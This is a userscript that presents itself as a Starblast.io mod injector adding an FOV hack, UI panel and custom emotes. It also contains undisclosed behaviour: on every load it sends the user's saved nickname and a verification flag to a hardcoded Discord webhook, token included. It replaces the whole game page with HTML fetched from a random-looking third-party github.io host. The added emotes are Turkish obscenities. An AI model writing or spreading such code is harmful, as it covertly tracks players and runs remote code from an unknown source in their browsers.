// ==UserScript==
// @name         EOT Injector V4 - Starblast.io
// @version      4.0.1
// @description  Modular Starblast mod injector with custom UI and patch pipeline
// @match        https://starblast.io/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';

  // ===== Global Mod Settings =====
  if (!window.sbCodeInjectors) window.sbCodeInjectors = [];
  window.modSettings = {
    fovEnabled: true,
    emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
    uiVisible: true,
    radarZoomEnabled: false,
    crystalColor: localStorage.getItem('crystal-color') || '#ffffff'
  };

  // ===== Utility =====
  const log = (msg, name = 'eot') => console.log(`%c[${name}] ${msg}`, "color: #FF00E6");

  function safeInject(name, func) {
    window.sbCodeInjectors.push((src) => {
      try {
        return func(src);
      } catch (e) {
        alert(`${name} failed: ${e}`);
        throw e;
      }
    });
  }

  // ===== Lowercase Name Injector =====
  safeInject("Lowercase Name", (src) => {
    return src
      .replace(/(document\.getElementById\(['"]player['"]\)\.value\s*=\s*[^;]+)\.toUpperCase\(\)/g, '$1')
      .replace('</head>', `<style>#player input { text-transform: none !important; }</style></head>`);
  });

  // ===== Custom Emote Injector =====
  safeInject("Custom Emotes", (src) => {
    const pattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
    const emotes = `, { text: "orosbu cocu", icon: "🤡", key: "J" }, { text: "sikerim", icon: "⚠️", key: "V" }`;
    return src.replace(pattern, `$1${emotes}`);
  });

  // ===== UI + Mods Injector =====
  safeInject("Main UI", (src) => {
    const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
    src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');

    const controlsHTML = `
<div id="mod-controls" style="position:fixed;top:12px;left:12px;z-index:1000;background:#111;color:#fff;padding:10px;border-radius:6px;width:180px;font-family:sans-serif">
  <strong>EOT Injector</strong>
  <div style="margin-top:10px">
    <label><input type="checkbox" id="fov-toggle" ${window.modSettings.fovEnabled ? 'checked' : ''}/> FOV Enabled</label><br>
    <label>Emote Cap <input type="range" min="1" max="5" id="emote-capacity-slider" value="${window.modSettings.emoteCapacity}"/></label>
    <br><label><input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}/> Radar Zoom</label><br>
    <label>Crystal Color <input type="color" id="crystal-color-picker" value="${window.modSettings.crystalColor}"/></label>
  </div>
</div>
<script>
  document.addEventListener('DOMContentLoaded', () => {
    const $ = id => document.getElementById(id);
    $('fov-toggle').onchange = e => window.modSettings.fovEnabled = e.target.checked;
    $('emote-capacity-slider').oninput = e => {
      window.modSettings.emoteCapacity = parseInt(e.target.value);
      localStorage.setItem('emote-capacity', e.target.value);
    };
    $('radar-zoom-toggle').onchange = e => window.modSettings.radarZoomEnabled = e.target.checked;
    $('crystal-color-picker').oninput = e => {
      window.modSettings.crystalColor = e.target.value;
      localStorage.setItem('crystal-color', e.target.value);
      if (window.updateCrystalColor) window.updateCrystalColor(e.target.value);
    };
  });
</script>
`;
    return src.replace('</body>', `${controlsHTML}</body>`);
  });

  // ===== Inject Loader =====
  function injectLoader() {
    if (window.location.pathname !== "/") return;

    document.open();
    document.write('<html><head><title></title></head><body><div style="text-align:center;padding:150px;color:#000;">Loading Starblast Mods...</div></body></html>');
    document.close();

    const url = `https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html?_=${Date.now()}`;
    const xhr = new XMLHttpRequest();
    log("Fetching game source...");

    xhr.open("GET", url);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        let src = xhr.responseText;
        window.sbCodeInjectors.forEach(fn => { src = fn(src); });
        log("Mods injected successfully");
        document.open(); document.write(src); document.close();
      }
    };
    xhr.send();
  }

  // ===== Webhook Logging =====
  (function () {
    const nickname = localStorage.getItem("lastNickname") || "Unknown";
    const ECP = localStorage.getItem("ECPVerified") || "no";
    const payload = {
      content: `${nickname} has entered the script\nECPVerified: ${ECP}`
    };

    fetch("https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).then(r => log("Webhook sent"))
      .catch(e => console.error("Webhook error:", e));
  })();

  // Run
  injectLoader();
})();
